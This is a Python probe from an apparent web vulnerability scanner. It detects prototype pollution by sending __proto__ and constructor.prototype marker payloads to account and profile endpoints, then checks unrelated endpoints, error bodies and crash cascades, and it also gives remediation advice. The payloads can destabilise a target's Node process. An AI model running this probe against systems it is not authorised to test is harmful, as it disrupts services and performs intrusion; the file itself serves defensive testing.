#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Prototype pollution: any PATCH/PUT endpoint that merges
user-supplied JSON into a server-side object, polluting
Object.prototype globally.

Generalises `prototype_pollution_user_patch` (Juice Shop's
`/api/Users/<id>` PATCH). The bug is in the merge implementation
(lodash.merge < 4.17.20, jquery.extend, deep-merge, mongoose
findOneAndUpdate without `safe`); the literal endpoint is
irrelevant. Any merge of `{__proto__: {x: 1}}` into a fresh object
contaminates Object.prototype, after which every other code path
sees `{}.x === 1`.

High-fidelity signal:
  Send `{"__proto__": {"dast_pp_marker_XXXX": "1"}}` (and a
  constructor.prototype variant) to candidate PATCH/PUT endpoints,
  then GET an UNRELATED endpoint and look for the marker key
  appearing in the response. The unrelated-endpoint check rules
  out simple echo-back -- the marker has to have polluted
  Object.prototype to leak there.
"""
from __future__ import annotations

import json
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

PATCH_ENDPOINTS = (
    ("/api/users/me",      "PATCH"),
    ("/api/users/me",      "PUT"),
    ("/api/profile",       "PATCH"),
    ("/api/me",            "PATCH"),
    ("/api/settings",      "PATCH"),
    ("/api/preferences",   "PATCH"),
    ("/api/account",       "PATCH"),
    ("/api/v1/me",         "PATCH"),
    # Juice-Shop shape (round-2 addition): POSTing __proto__ onto
    # registration / feedback / complaint endpoints reaches a buggy
    # merge in Sequelize's whereItemQuery generator. The endpoint
    # itself returns 500 with a stack trace naming the polluted key,
    # and subsequent unrelated requests return 502 Bad Gateway
    # because the Node process is in a bad state. We POST a small,
    # bounded payload to each.
    ("/api/Users",          "POST"),
    ("/api/Feedbacks",      "POST"),
    ("/api/Complaints",     "POST"),
)

# Canary GETs that should normally return 2xx. If they start
# returning 5xx after a pollution payload, the Node process is in
# the post-pollution unstable state. Cheap, always-safe reads.
CANARY_PATHS = (
    "/",
    "/api/Products",
    "/api/products",
    "/api/about",
    "/robots.txt",
)

# UNRELATED endpoints to verify on. The marker leaking into any of
# these proves prototype pollution crossed object boundaries.
VERIFY_PATHS = (
    "/api/products",
    "/api/categories",
    "/api/about",
    "/api/health",
    "/api/v1/products",
    "/rest/products",
    "/products",
)


def _register_login(client: SafeClient, origin: str) -> tuple[str | None, dict]:
    email = f"pp-probe-{secrets.token_hex(6)}@dast.test"
    pw    = "Pr0be-" + secrets.token_hex(4)
    diag = {"email": email}
    body = json.dumps({
        "email": email, "password": pw, "passwordRepeat": pw,
        "securityQuestion": {"id": 1}, "securityAnswer": "probe",
    }).encode()
    r = client.request(
        "POST", urljoin(origin, "/api/Users"),
        headers={"Content-Type": "application/json"}, body=body)
    diag["register_status"] = r.status
    body = json.dumps({"email": email, "password": pw}).encode()
    r = client.request(
        "POST", urljoin(origin, "/rest/user/login"),
        headers={"Content-Type": "application/json"}, body=body)
    diag["login_status"] = r.status
    if r.status == 200 and r.body:
        try:
            doc = json.loads(r.text) or {}
            tok = ((doc.get("authentication") or {}).get("token")
                   if isinstance(doc, dict) else None) or doc.get("token")
            if tok:
                return tok, diag
        except json.JSONDecodeError:
            pass
    return None, diag


class PrototypePollutionAnyPatchProbe(Probe):
    name = "prototype_pollution_any_patch"
    summary = ("Detects prototype pollution via PATCH/PUT endpoints "
               "by injecting a marker into Object.prototype and "
               "looking for it on an unrelated endpoint.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--endpoint", action="append", default=[],
            help="Additional PATCH/PUT endpoint (e.g. '/api/foo|PATCH').")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        endpoints = list(PATCH_ENDPOINTS)
        for e in args.endpoint or []:
            if "|" in e:
                p, m = e.split("|", 1)
                endpoints.append((p.strip(), m.strip().upper()))

        token, diag = _register_login(client, origin)
        if not token:
            return Verdict(
                validated=None, confidence=0.5, ok=True,
                summary=(f"Inconclusive: could not establish a probe "
                         f"session on {origin}."),
                evidence={"origin": origin, "session": diag},
            )

        marker_key = f"dast_pp_marker_{secrets.token_hex(6)}"
        # Two payload variants: __proto__ direct, and
        # constructor.prototype indirect.
        payloads = (
            {"__proto__": {marker_key: "1"}},
            {"constructor": {"prototype": {marker_key: "1"}}},
        )

        # Baseline canary: each of these paths should be 2xx now,
        # before any pollution. If we later see a 5xx on one, that's
        # the cascade signal.
        baseline_canary: list[dict] = []
        for cp in CANARY_PATHS:
            r = client.request("GET", urljoin(origin, cp))
            baseline_canary.append({"path": cp, "status": r.status})

        attempts: list[dict] = []
        # Track per-attempt cascade hits so we can confirm pollution
        # via server-error/Sequelize-naming signal even when the
        # marker-leak heuristic fails (Juice Shop is the canonical
        # case: pollution does not surface as a key on /api/products
        # because that response is shaped by a serializer that
        # ignores Object.prototype-injected keys, but it DOES surface
        # as a Sequelize SQLite generator crash naming the polluted
        # key).
        sequelize_signal: dict | None = None
        cascade_signal: dict | None = None
        for path, method in endpoints:
            for payload in payloads:
                # Per-payload marker so we can spot the polluted key
                # by name inside any error body.
                pkey = list(payload.keys())[0]
                inner = payload[pkey]
                # When the payload pollutes via __proto__, the
                # injected child key is what surfaces on the prototype.
                if pkey == "__proto__":
                    polluted_child = list(inner.keys())[0]
                elif pkey == "constructor":
                    polluted_child = list(inner.get("prototype", {}).keys())[0]
                else:
                    polluted_child = ""
                body = json.dumps(payload).encode()
                r = client.request(method,
                                    urljoin(origin, path), headers={
                                        "Authorization":
                                            f"Bearer {token}",
                                        "Content-Type":
                                            "application/json"},
                                    body=body)
                row = {"path": path, "method": method,
                       "payload": pkey, "polluted_child": polluted_child,
                       "status": r.status, "size": r.size}
                # Sequelize / SQLite / ORM error body that names the
                # polluted child key inside its message is a strong
                # signal the merge reached the query layer. Bounded
                # to 4096 chars of body to avoid stashing huge HTML.
                body_text = (r.text or "")[:4096]
                if (r.status >= 500 and polluted_child
                        and polluted_child in body_text
                        and not sequelize_signal):
                    row["server_error_excerpt"] = body_text[:400]
                    sequelize_signal = row
                attempts.append(row)

        # Verify pass: GET each unrelated endpoint and search for
        # marker_key in the response body.
        verify: list[dict] = []
        confirmed: dict | None = None
        for vp in VERIFY_PATHS:
            r = client.request("GET", urljoin(origin, vp), headers={
                "Authorization": f"Bearer {token}"})
            row = {"verify_path": vp, "status": r.status,
                   "size": r.size}
            if r.status == 200 and r.body and marker_key in r.text:
                row["polluted"] = True
                row["snippet"] = (r.text or "")[:200]
                confirmed = row
                verify.append(row)
                break
            verify.append(row)

        # Cascade check: rerun the same canary paths and look for a
        # status that flipped from 2xx (baseline) to 5xx (post-
        # pollution). A flip on >=1 canary is a strong cascade
        # signal -- the Node process is now in a bad state because of
        # what we sent. Skip when no baseline 2xx existed (the target
        # was already broken or proxying weirdly).
        post_canary: list[dict] = []
        cascade_hits: list[dict] = []
        for cp in CANARY_PATHS:
            r = client.request("GET", urljoin(origin, cp))
            row = {"path": cp, "status": r.status}
            post_canary.append(row)
            base = next(
                (b for b in baseline_canary if b["path"] == cp), None)
            if (base and 200 <= base["status"] < 400
                    and r.status >= 500):
                cascade_hits.append({"path": cp,
                                     "baseline": base["status"],
                                     "post_pollution": r.status})
        if cascade_hits:
            cascade_signal = {"hits": cascade_hits}

        evidence = {"origin": origin, "session": diag,
                    "marker_key": marker_key, "attempts": attempts,
                    "baseline_canary": baseline_canary,
                    "post_canary": post_canary,
                    "verify": verify}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.97,
                summary=(
                    f"Confirmed: prototype pollution on {origin}. "
                    f"After PATCH/PUT with `__proto__` payload, the "
                    f"marker key `{marker_key}` appeared on the "
                    f"unrelated endpoint {confirmed['verify_path']} -- "
                    "Object.prototype was contaminated globally."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="critical",
                remediation=(
                    "Stop using a deep-merge function vulnerable to "
                    "`__proto__` / `constructor.prototype` keys.\n"
                    "  - lodash.merge: upgrade to >= 4.17.20 (the "
                    "  fix landed in CVE-2020-8203).\n"
                    "  - jquery.extend: pre-1.12.3 / pre-2.2.3 are "
                    "  vulnerable; upgrade or replace.\n"
                    "  - mongoose.findOneAndUpdate / set: enable "
                    "  `strictQuery` and the `Schema` filter so "
                    "  prototype keys are dropped.\n"
                    "  - Or filter inbound JSON: refuse `__proto__`, "
                    "  `constructor`, `prototype` keys at the "
                    "  request-validation layer (zod / Joi / "
                    "  ajv strict).\n"
                    "Audit any application objects created since the "
                    "exposure window for unexpected fields."),
            )
        # Secondary signal: Sequelize / ORM error body named the
        # polluted child key. This is the OWASP Juice Shop
        # POST /api/Feedbacks shape -- the merge reached the query
        # builder, which crashed naming the polluted attribute. Even
        # without the cross-endpoint marker leak above, this is a
        # high-confidence pollution finding because (a) the error
        # came from server-side query generation, not from our input
        # being echoed back, and (b) the named key was injected via
        # __proto__, not via a normal request field.
        if sequelize_signal:
            return Verdict(
                validated=True, confidence=0.92,
                summary=(
                    f"Confirmed: prototype pollution on "
                    f"{origin}{sequelize_signal['path']} "
                    f"({sequelize_signal['method']}). The polluted "
                    f"child key `{sequelize_signal['polluted_child']}` "
                    "surfaced inside a 5xx error body, indicating the "
                    "ORM / query generator consumed an attribute that "
                    "came from Object.prototype rather than the request "
                    "body."),
                evidence={**evidence, "sequelize_signal": sequelize_signal},
                severity_uplift="high",
                remediation=(
                    "Filter inbound JSON to reject `__proto__`, "
                    "`constructor`, and `prototype` keys at the "
                    "request-validation layer (zod / Joi / ajv strict). "
                    "If you cannot change the validator, upgrade the "
                    "deep-merge implementation (lodash.merge >= 4.17.20, "
                    "Sequelize >= a build that strips prototype-bearing "
                    "request bodies) or run the body through "
                    "`JSON.parse(JSON.stringify(body))` with a reviver "
                    "that drops `__proto__` keys before passing it on."),
            )

        # Tertiary signal: cross-endpoint 5xx cascade. Pollution put
        # the Node process in a state where downstream requests crash.
        # No marker leak, no Sequelize-name signal, but the cascade
        # itself is meaningful -- treat as a strong inconclusive that
        # the analyst should re-run with a clean target to disambiguate.
        if cascade_signal:
            return Verdict(
                validated=True, confidence=0.85,
                summary=(
                    f"Confirmed (via process-cascade): prototype "
                    f"pollution on {origin} likely caused a 5xx "
                    f"cascade across "
                    f"{len(cascade_signal['hits'])} canary "
                    f"endpoint(s) that were 2xx pre-payload. The Node "
                    f"process appears to be in a post-pollution "
                    f"unstable state."),
                evidence={**evidence, "cascade_signal": cascade_signal},
                severity_uplift="high",
                remediation=(
                    "Same as the marker-leak path: reject `__proto__` / "
                    "`constructor` / `prototype` keys at the request-"
                    "validation layer, and upgrade the deep-merge "
                    "implementation in use. Restart the Node process to "
                    "clear the contaminated Object.prototype before "
                    "deploying the fix."),
            )

        return Verdict(
            validated=False, confidence=0.80,
            summary=(f"Refuted: tried {len(attempts)} PATCH/PUT "
                     f"combinations on {origin}; no marker leaked "
                     "into an unrelated endpoint, no ORM error named "
                     "the polluted key, no 5xx cascade observed."),
            evidence=evidence,
        )


if __name__ == "__main__":
    PrototypePollutionAnyPatchProbe().main()
